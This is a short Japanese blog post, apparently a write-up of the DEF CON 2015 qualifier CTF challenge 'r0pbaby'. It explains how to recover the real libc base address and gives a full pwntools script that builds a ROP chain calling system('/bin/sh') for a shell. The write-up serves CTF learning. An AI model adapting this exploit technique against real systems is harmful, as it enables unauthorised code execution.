---
layout: post
alias: "/blog/2016/01/07/defcon-qualifier-ctf-2015-r0pbaby/"
title: "DEF CON Qualifier 2015: r0pbaby"
date: 2016-01-07T00:49:08+09:00
tags: [ "ctf", "writeup", "pwn", "rop" ]
---

## [Baby's First 1: r0pbaby](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby)

>   r0pbaby\_542ee6516410709a1421141501f03760.quals.shallweplayaga.me:10436 [Download]()

起動すると以下のようにmenuが現れ色々と親切にしてくれる問題。
ただしその分asmは読みにくい。

``` sh
$ ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007EFE0BB324D0
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007EFE0B3DA890
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 8
DDDDDDDD4
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Exiting.
```

ただし、表示されるのは中で`dlopen`をして得られた`libc.so.6`のアドレスであるため、これの上に飛ぼうとするとsegvする。
`dlopen`されたlibcと本来のlibcのアドレスの差は固定のようなので、これを元に本来のlibcのアドレスを求める。

`libc.so.6`が与えられない[^1]が、おそらくこれは表示させたシンボルのアドレスから[libcdb.com](http://libcdb.com/)などでlibcを検索すればよい。
手元で動かしたものから検索しても引っかからなかったが、これはosがarchであるから登録がなされていないのだとして無視した。[^2]

``` python
#!/usr/bin/env python2
from pwn import * # https://github.com/Gallopsled/pwntools/tree/2.2/pwnlib

context.log_level = 'debug'
# p = process('./r0pbaby')
p = remote('localhost', 8022)

p.sendlineafter(': ', '1')
p.recvuntil(': ')

offset = 0x7974d0 # difference between dlopen-ed libc and original libc, from (attached) gdb
libc = int(p.recvline(keepends=False), 16) - offset

# on my /usr/lib/libc.so.6
pop_rdi_ret = 0x21012
system = 0x3f890
bin_sh = 0x1653b8

payload = ''
payload += p64(0) # pop ebp
payload += p64(libc + pop_rdi_ret) # ret
payload += p64(libc + bin_sh)
payload += p64(libc + system)

p.sendlineafter(': ', '3')
p.sendlineafter(': ', str(len(payload)))
p.send(payload)

p.sendline('4')

p.sendline('ls')
p.interactive()
```

[^1]: ように見える
[^2]: 詳しくないので正直少し不安
